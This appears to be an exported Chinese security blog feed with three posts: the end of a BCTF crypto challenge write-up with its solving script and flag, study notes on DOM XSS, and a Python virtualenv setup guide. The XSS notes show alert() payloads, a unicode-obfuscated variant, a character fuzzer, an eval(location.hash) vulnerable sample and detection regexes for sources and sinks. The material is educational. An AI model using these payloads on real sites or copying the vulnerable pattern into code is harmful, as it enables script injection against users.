class="line">而k^rn 可以通过(m,r,c)对来获得</span><br><span class="line">这里直接使用encode公式c=[(k^r%N)*m]%N</span><br><span class="line">通过推导可以得出k^r=c*(m^-1)</span><br><span class="line">m的逆元可以通过扩展欧几里德算法来求得</span><br></pre></td></tr></table></figure></p><p>有了上面的思路，就可以写程序来加解密了，这里我用了python来写，其中(m,r,c)对我事先拿出来了，清楚一点,下面的程序是来算k的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">import msgpack</span><br><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">N = 23927411014020695772934916764953661641310148480977056645255098192491740356525240675906285700516357578929940114553700976167969964364149615226568689224228028461686617293534115788779955597877965044570493457567420874741357186596425753667455266870402154552439899664446413632716747644854897551940777512522044907132864905644212655387223302410896871080751768224091760934209917984213585513510597619708797688705876805464880105797829380326559399723048092175492203894468752718008631464599810632513162129223356467602508095356584405555329096159917957389834381018137378015593755767450675441331998683799788355179363368220408879117131L</span><br><span class="line"></span><br><span class="line">def Ext_Euclid (a , b ):</span><br><span class="line">        <span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">        扩展欧几里得算法  a*x + b*y = gcd(a,b)  返回 x,y以及a，b的最大公约数gcd</span></span><br><span class="line"><span class="string">        :param a:</span></span><br><span class="line"><span class="string">        :param b:</span></span><br><span class="line"><span class="string">        :return:x,y以及a，b的最大公约数gcd</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        '</span><span class="string">''</span></span><br><span class="line">        <span class="keyword">if</span> (b == 0):</span><br><span class="line">            <span class="built_in">return</span> 1 , 0 , a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x , y , q=Ext_Euclid( b , a % b )</span><br><span class="line">            x , y = y,( x - (a // b) * y )</span><br><span class="line">            <span class="built_in">return</span> x , y , q</span><br><span class="line">m1=8246074182642091125578311828374843698994233243811347691229334829218700728624047916518503687366611595562099039411430662968666847086659721231623198995017758424796091810259884653332576136128144958751327844746991264667007359518181363522934430676655236880489550093852524801304612322373542296281962196795304499711006801211783005857297362930338978872451934860435597545642219213551685973208209873623909629278321181485010964460652298690058747090298312365230671723790850998541956664376820820570709272500330966205578898690396706695024001970727864091436518202414166919020415892764617055978488996164642229582717493375419993187360L</span><br><span class="line"></span><br><span class="line">c1=14548997380897265239778884825381301109965518989661808090688952232381091726761464959572943383024428028270717629953894592890859128818839328499002950828491521254480795364789013196240119403187073307558598496713832435709741997056117831860370227155633169019665564392649528306986826960829410120348913586592199732730933259880469229724149887380005627321752843489564984358708013300524640545437703771424168108213045567568595093421366224818609501318783680497763353618110184078118456368631056649526433730408976988014678391205055298782061128568056163894010397245301425676232126267874656710256838457728944370612289985071385621160886L</span><br><span class="line"></span><br><span class="line">m11=RSA.inverse(m1,N)<span class="comment"># 求逆元</span></span><br><span class="line">kr1=m11*c1</span><br><span class="line"></span><br><span class="line">m2=15575051453858521753108462063723750986386093067763948316612157946190835527332641201837062951012227815568418309166473080588354562426066694924364886916408150576082667797274000661726279871971377438362829402529682825471299861814829463510659258586020732228351258291527965822977048954720558973840956731377322516168809373640494227129998871167089589689796024458501705704779109152762373660542684880052489213039920383757930855300338529058000330103359636123251274293258L</span><br><span class="line"></span><br><span class="line">c2=12793942795110038319724531875568693507469327176085954164034728727511164833335101755153514030256152878364664079056565385331901196541015393609751624971554016671160730478932343949538202167508319292084519621768851878526657022981883304260886841513342396524869530063372782511380879783246034751883691295368172069170967975561364277514063320691930900258017293871754252209727301719207692321798229276732198521711602080244950295889575423383308099786298184477668302842952215665734671829249323604032320696267130330613134368640401070775927197554082071807605399448960911234829590548855031180158567578928333030631307816223152118126597L</span><br><span class="line"></span><br><span class="line">m21=RSA.inverse(m2,N)</span><br><span class="line">kr2=m21*c2</span><br><span class="line"><span class="comment"># print kr2</span></span><br><span class="line"></span><br><span class="line">r1=12900676191620430360427117641859547516838813596331616166760756921115466932766990479475373384324634210232168544745677888398849094363202992662466063289599443L</span><br><span class="line"></span><br><span class="line">r2=7718975159402389617924543100113967512280131630286624078102368166185443466262861344357647019797762407935675150925250503475336639811981984126529557679881059L</span><br><span class="line"></span><br><span class="line">a,b,_=Ext_Euclid(r1,r2)</span><br><span class="line"><span class="built_in">print</span> a</span><br><span class="line"><span class="built_in">print</span> b</span><br><span class="line"><span class="comment"># print a*r1+b*r2</span></span><br><span class="line"></span><br><span class="line">x1=RSA.inverse(kr2,N)</span><br><span class="line">k=(pow(kr1, a,N)*pow(x1,-b,N))%N</span><br><span class="line"><span class="built_in">print</span> k</span><br></pre></td></tr></table></figure></p><p>通过上面的程序可以算出</p><p><code>k=175971776542095822590595405274258668271271366360140578776612582276966567082080372980811310146217399585938214712928761559525614866113821551467842221588432676885027725038849513527080849158072296957428701767142294778752742980766436072183367444762212399986777124093501619273513421803177347181063254421492621011961L</code></p><p>接下来就简单了将k带入官方的算法就可以得到flag.<code>BCTF{q0000000000b3333333333-ju57-w0n-pwn20wn!!!!!!!!!!!!}</code><br>上面程序中需要注意的是pow函数不支持指数为负数的情况，所以还要再转一下弯。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a&gt;0,b&lt;0</span><br><span class="line">(k^r)^b</span><br><span class="line">=(k^-r)^-b</span><br><span class="line">所以可以先求出k^r mod N的逆元</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>数学方面的知识还是短板啊，以后得加强一下:)</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【VULNERABLITY】DOM XSS</title>
      <link href="/2016/03/17/old-DOM-XSS/"/>
      <url>/2016/03/17/old-DOM-XSS/</url>
      
        <content type="html"><![CDATA[<h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>　　这几天阅读了<em>《Web前端黑客技术揭秘》</em> ，对DOM型的XSS进行一个总结，内容主要为书中提到的知识点，整理整理作以后复习所用。<br>　　DOM类型的XSS与反射型、存储型XSS都不同，DOM型XSS不用服务器端解析响应的参与，触发DOM型XSS可以说主要依靠浏览器客户端的解析。常见的输出点见<strong>0x04附录</strong>。<br><a id="more"></a></p><h3 id="DOM渲染"><a href="#DOM渲染" class="headerlink" title="DOM渲染"></a>DOM渲染</h3><p>　　首先我们来理解一下HTML与Javascript自解码机制，查看以下三个例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;)&quot; /&gt;</span><br><span class="line">2. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(HtmlEncode(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;))&quot; /&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function HtmlEncode(str) &#123;</span><br><span class="line">var s=&quot;&quot;;</span><br><span class="line">if(str.length==0) return &quot;&quot;;</span><br><span class="line">s=str.replace(/&amp;/g, &quot;&amp;amp;&quot;);</span><br><span class="line">s=str.replace(/&lt;/g, &quot;&amp;lt;&quot;);</span><br><span class="line">s=str.replace(/&gt;/g, &quot;&amp;gt;&quot;);</span><br><span class="line">s=str.replace(/\&quot;/g, &quot;&amp;quot;&quot;);</span><br><span class="line">return s;</span><br><span class="line">&#125;</span><br><span class="line">3. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(&apos;&amp;lt;img src=@ onerror=alert(123) /&amp;gt;&apos;)&quot; /&gt;</span><br></pre></td></tr></table></figure></p><p>　　对于第一种情况，很清楚，点击这个按钮后，会将<code>&lt;img src=@ onerror=alert(123) /&gt;</code>写入DOM中，并触发<code>alert(123)</code>。而第二种与第三种，<code>document.write</code>的内容都变成了<code>&amp;lt;img src=@ onerror=alert(123) /&amp;gt;</code>，区别在于一个是在HTML标签中,一个是通过Javascript处理后才变成这个样子的，那么这2种情况都会触发弹窗吗？答案是第二种不会，而第三种会触发。<br>　　形成这样的原因就是因为HTML与Javascript自解码机制，在HTML标签中的javascript可以进行HTML形式的编码。在HTML标签中的javascript代码会先被HTML形式的编码进行解码，即第三种情况中<code>&amp;lt;img src=@ onerror=alert(123) /&amp;gt;</code>在javascript运行前已经解码为<code>&lt;img src=@ onerror=alert(123) /&gt;</code>，而第二种情况为javascript运行中进行的HTML形式的编码，所以写到DOM中时直接显示在页面上。<br>HTML中的编码：</p><ul><li>进制编码：&#xH;(十六进制格式)、&#D;(十进制格式),最后的分号可以不要</li><li>HTML实体编码：即上面的那个HtmlEncode</li></ul><p>　　那么同样的，在javascript上下文环境中，将内容改为javascript的编码，同样会自解码，我们来看下一个例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;button&quot; id=&quot;exec_btn&quot; value=&quot;exec&quot; /&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function $(id)&#123;return document.getElementById(id);&#125;;</span><br><span class="line">$(&apos;exec_btn&apos;).onclick=function()&#123;</span><br><span class="line">document.write(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;);</span><br><span class="line">document.write(&apos;\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0040\u0020\u006f\u006e\u0065\u0072\u0072\u006f\u0072\u003d\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0032\u0033\u0029\u0020\u002f\u003e&apos;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　上面2中write出现的结果是相同的，同样的道理，由于上述编码为javascript的编码形式，并且在javascript的上下文环境中，会先进行解码，再运行javascript。<br>JavaScript中的编码：</p><ul><li>Unicode形式：\uH</li><li>普通十六进制：\xH</li><li>纯转义：\’、\”、\&lt;、>这样在特殊字符前加\进行转义</li></ul><p>　　通过上面几个例子，我们可以知道在HTML中与在Javascript中自动解码的差异，如果防御没有区分这样的场景，就会出现问题。<br>　　理解了上述的自解码机制，在不同的标签下会有不同的结果，比如一下几个标签会自带HtmlEncode功能<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;iframe&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;noscript&gt;&lt;/noscript&gt;</span><br><span class="line">&lt;noframes&gt;&lt;/noframes&gt;</span><br><span class="line">&lt;textarea&gt;&lt;/textarea&gt;</span><br><span class="line"></span><br><span class="line">&lt;xmp&gt;&lt;/xmp&gt;</span><br><span class="line">&lt;plaintext&gt;&lt;/plaintext&gt;</span><br></pre></td></tr></table></figure></p><p>　　<code>&lt;xmp&gt;</code>没有HtmlEncode功能，<code>&lt;plaintext&gt;</code>在Firefox下会进行HtmlEncode编码，在chrome下不会。</p><h3 id="DOM-fuzzing"><a href="#DOM-fuzzing" class="headerlink" title="DOM fuzzing"></a>DOM fuzzing</h3><p>　　直接看代码把  下面的程序用python编写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">def get_template(template_file):</span><br><span class="line">    &quot;&quot;&quot;获取fuzzing的模板文件内容&quot;&quot;&quot;</span><br><span class="line">    content=&apos;&apos;</span><br><span class="line">    with open(template_file) as f:</span><br><span class="line">        content=f.read()</span><br><span class="line">    return content</span><br><span class="line"></span><br><span class="line">def set_result(result_file,result):</span><br><span class="line">    &quot;&quot;&quot;生成fuzzing结果文件&quot;&quot;&quot;</span><br><span class="line">    with open(result_file,&apos;w&apos;) as f:</span><br><span class="line">        f.write(result)</span><br><span class="line">def fuzzing(fuzz_file,result_file):</span><br><span class="line">    template=get_template(fuzz_file)</span><br><span class="line">    fuzz_area_0=template.find(&apos;&lt;fuzz&gt;&apos;)</span><br><span class="line">    fuzz_area_1=template.find(&apos;&lt;/fuzz&gt;&apos;)</span><br><span class="line">    fuzz_area=template[fuzz_area_0+6:fuzz_area_1].strip()</span><br><span class="line">    # chars=[]</span><br><span class="line">    chars=[]</span><br><span class="line">    for i in xrange(255): # ASCII玛转换为字符</span><br><span class="line">        if i!=62:</span><br><span class="line">            chars.append(chr(i))</span><br><span class="line"></span><br><span class="line">    fuzz_area_result=&apos;&apos;</span><br><span class="line">    for c in chars: #遍历这些字符 逐一生成fuzzing内容</span><br><span class="line">        fuzz_area_r=fuzz_area.replace(&apos;&#123;&#123;char&#125;&#125;&apos;,c)</span><br><span class="line">        fuzz_area_r=fuzz_area_r.replace(&apos;&#123;&#123;id&#125;&#125;&apos;,str(ord(c)))</span><br><span class="line">        fuzz_area_result+=fuzz_area_r+&apos;\n&apos;</span><br><span class="line">        print fuzz_area_r</span><br><span class="line">    result=template.replace(fuzz_area,fuzz_area_result)</span><br><span class="line">    set_result(result_file,result)</span><br><span class="line"></span><br><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">    fuzzing(&quot;fuzz_xss_0.html&quot;,&quot;res.html&quot;)</span><br></pre></td></tr></table></figure></p><p>　　下面为fuzz_xss_0.html的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Fuzz xss 0&lt;/title&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        function $(x)&#123;return document.getElementById(x);&#125;</span><br><span class="line">        function f(id)&#123;</span><br><span class="line">            $(&apos;result&apos;).innerHTML+=id+&apos;&lt;br/&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h3&gt;Fuzzing Result:&lt;/h3&gt;</span><br><span class="line">&lt;code&gt;</span><br><span class="line">    &#123;&#123;id&#125;&#125;: &lt;&#123;&#123;char&#125;&#125;script&gt;f(&quot;&#123;&#123;id&#125;&#125;&quot;)&lt;/script&gt;</span><br><span class="line">&lt;/code&gt;</span><br><span class="line">&lt;div id=&quot;result&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;br/&gt;</span><br><span class="line">&lt;h3&gt;Fuzzing...&lt;/h3&gt;</span><br><span class="line">&lt;fuzz&gt;</span><br><span class="line">    &#123;&#123;id&#125;&#125;: &lt;&#123;&#123;char&#125;&#125;script&gt;f(&quot;&#123;&#123;id&#125;&#125;&quot;)&lt;/script&gt;&lt;br/&gt;</span><br><span class="line">&lt;/fuzz&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>　　通过上面的fuzzing技巧，可以自行扩展</p><h3 id="DOM-XSS-挖掘"><a href="#DOM-XSS-挖掘" class="headerlink" title="DOM XSS 挖掘"></a>DOM XSS 挖掘</h3><ol><li>静态方法<br>　　静态方法查找危险关键字，可以使用下列正则表达式来匹配。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Finding Sources</span><br><span class="line"></span><br><span class="line">The following regular expression attempts to match most common DOMXSS sources (BETA):</span><br><span class="line"></span><br><span class="line">/(location\s*[\[.])|([.\[]\s*[&quot;&apos;]?\s*(arguments|dialogArguments|innerHTML|write(ln)?|open(Dialog)?|showModalDialog|cookie|URL|documentURI|baseURI|referrer|name|opener|parent|top|content|self|frames)\W)|(localStorage|sessionStorage|Database)/</span><br><span class="line"></span><br><span class="line">Finding Sinks</span><br><span class="line"></span><br><span class="line">The following regular expression attempts to match most common DOMXSS sinks (BETA):</span><br><span class="line"></span><br><span class="line">/((src|href|data|location|code|value|action)\s*[&quot;&apos;\]]*\s*\+?\s*=)|((replace|assign|navigate|getResponseHeader|open(Dialog)?|showModalDialog|eval|evaluate|execCommand|execScript|setTimeout|setInterval)\s*[&quot;&apos;\]]*\s*\()/</span><br><span class="line"></span><br><span class="line">This regular expression finds sinks based on jQuery, it also finds the $ function, which is not always insecure:</span><br><span class="line"></span><br><span class="line">/after\(|\.append\(|\.before\(|\.html\(|\.prepend\(|\.replaceWith\(|\.wrap\(|\.wrapAll\(|\$\(|\.globalEval\(|\.add\(|jQUery\(|\$\(|\.parseHTML\(/</span><br></pre></td></tr></table></figure></li></ol><p>详情可以看<a href="https://code.google.com/archive/p/domxsswiki/wikis/FindingDOMXSS.wiki" target="_blank" rel="noopener">https://code.google.com/archive/p/domxsswiki/wikis/FindingDOMXSS.wiki</a><br>一旦发现页面存在可疑特征，就进行人工分析，这是静态方法的代价，对人工参与要求很高</p><ol start="2"><li>动态方法<br>　动态方法相当于一次Javascript源码动态审计的过程。书中提到了两种思路<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">eval(location.hash.substr(1));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ol><p>　就拿上面的例子来说，如何检测上面的DOM XSS</p><h6 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h6><p>　　借用浏览器自身的动态性，可以写Firefox插件，批量对目标地址发起请求（一个模糊测试的过程），请求的形式为：在目标地址后加上#fuzzing内容，就当前这个例子来说。比如当前fuzzing内容为：<code>var x=&#39;d0mx55&#39;</code><br>　　并且对常见的输出点函数进行劫持，如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var _eval=eval;</span><br><span class="line">eval=function(x)&#123;</span><br><span class="line">if(typeof(x)==&apos;undefined&apos;)&#123;return;&#125;</span><br><span class="line">if(x.indexOf(&apos;d0mx55&apos;)!=-1)&#123;alert(&apos;found dom xss&apos;);</span><br><span class="line">_eval(x);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>　　在javascript层面劫持innerHTML这样的属性已经没那么容易了，常用的属性劫持可以针对具体的对象设置<code>__defineSetter__</code>，比如下面的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.__defineSetter__(&apos;x&apos;,function()&#123;alert(&apos;hijack x&apos;)&#125;);</span><br><span class="line">window.x=&apos;xxxxxYYYYYYYY&apos;;</span><br></pre></td></tr></table></figure></p><p>当x赋值的时候，就会触发事先定义好的Setter方法。innerHTML属性属于那些节点对象，想劫持具体节点对象的innerHTML，需要事先知道这个具体节点的对象，然后设置<code>__defineSetter__</code>,这样如果要检测DOM XSS，就要劫持所有的输出点，比较麻烦，那么思路二可能会比较简单一点</p><h6 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h6><p>　　仍然借用浏览器动态执行的优势，写一个Firefox插件，我们完全以黑盒的方式进行模糊测试输入点，然后判断渲染后的DOM树中是否有我们期待的值，比如，模糊测试的内容都有如下一段代码<code>document.write(&#39;d0m&#39;+&#39;x55&#39;)</code>如果这段代码顺利执行了就会存在d0mx55文本节点，后续的检测工作只要判断是否存在这个文本节点就可以了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(document.documentElement.innerHTML.indexOf(&apos;d0mx55&apos;)!=-1)&#123;</span><br><span class="line">alert(&apos;found dom xss&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这个思路以DOM树的改变为判断依据，简单准确，但是同样无法避免那些逻辑判断上导致的漏报。</p><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><table><thead><tr><th>输出点</th><th>javascript code</th></tr></thead><tbody><tr><td>直接输出HTML内容</td><td>document.write(…)<br>document.writeln(…)<br> document.body.innerHtml=…</td></tr><tr><td>直接修改DOM树（包括DHTML事件）</td><td>document.forms[0].action=…<br>document.attachEvent(…)<br>document.create…(…)<br>document.execCommand(…)<br>document.body. …<br>widow.attachEvent(…)</td></tr><tr><td>替换document url</td><td>document.location=…(以及直接赋值给location的href,host,hostname属性)<br>document.location.hostname=…<br>document.location.replace(…)<br>document.location.assign(…)<br>documnent.URL=…<br>window.navigate(…)</td></tr><tr><td>打开或修改新窗口</td><td>document.open(…)<br>window.open(…)<br>window.location.href=…(以及直接赋值给location的href,host,hostname属性)</td></tr><tr><td>直接执行脚本</td><td>eval(…)<br>window.execScript(…)<br>window.setInterval(…)<br>window.setTimeout(…)</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OTHERS】flask virtualenv环境搭建</title>
      <link href="/2016/03/16/old-flask-virtualenv/"/>
      <url>/2016/03/16/old-flask-virtualenv/</url>
      
        <content type="html"><![CDATA[<h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>python virtualenv为flask等web框架提供虚拟python环境（其他应用也可以），这样可以防止开发过程中安装的依赖影响原主机上的python环境，而且在迁移到上线环境中时，省去了配置上线环境中的python运行环境。<br><a id="more"></a></p><h3 id="安装virtualenv"><a href="#安装virtualenv" class="headerlink" title="安装virtualenv"></a>安装virtualenv</h3><p>　　这里我推荐使用pip或者easy_install安装，同样也可以通过下载<a href="https://pypi.python.org/pypi/virtualenv" target="_blank" rel="noopener">virtualenv.py</a>来构建虚拟环境。<br>　　使用pip命令 <code>pip install virtualenv</code></p><h3 id="建立环境"><a href="#建立环境" class="headerlink" title="建立环境"></a>建立环境</h3><p>　　首先进入网站的根目录（或者是任何需要建立虚拟环境的文件夹下）<br>　　使用dos命令 <code>virtualenv venv</code> 其中venv为python的虚拟环境，其中包括了python.exe、pip、easy_install等python环境。</p><h3 id="激活环境"><a href="#激活环境" class="headerlink" title="激活环境"></a>激活环境</h3><p>　　完成上一步后，接下来需要在dos界面激活虚拟环境，这样可以使得接下来下载的python模块都位于venv下的pip环境中<br><code>Scripts\activate   激活虚拟环境</code><br><code>deactivate  退出虚拟环境</code><br>　　激活后命令行开头多了（venv），如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E:\code\python-workplace\flasker\venv&gt;Scripts\activate</span><br><span class="line">(venv) E:\code\python-workplace\flasker\venv&gt;</span><br></pre></td></tr></table></figure></p><h3 id="安装模块"><a href="#安装模块" class="headerlink" title="安装模块"></a>安装模块</h3><p>　　在上面的基础下，通过<code>pip install xxxx</code>安装的模块都是安装在venv环境下的，对主机上的环境没有影响。</p><h3 id="引入路径"><a href="#引入路径" class="headerlink" title="引入路径"></a>引入路径</h3><p>　　在具体使用过程中，需要把venv的路径导入sys.path，这样才可以使用虚拟环境中的python模块。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">importos,sys</span><br><span class="line">sys.path.append(os.getcwd()+<span class="string">'\\venv\\Lib\\site-packages'</span>)</span><br></pre></td></tr></table></figure></p><p>　　到这里就完成了python虚拟环境的搭建，总体对经常变动编程环境的城旭猿来说这是个非常有用功能。<br>　　<strong>==The End==</strong></p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> others </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
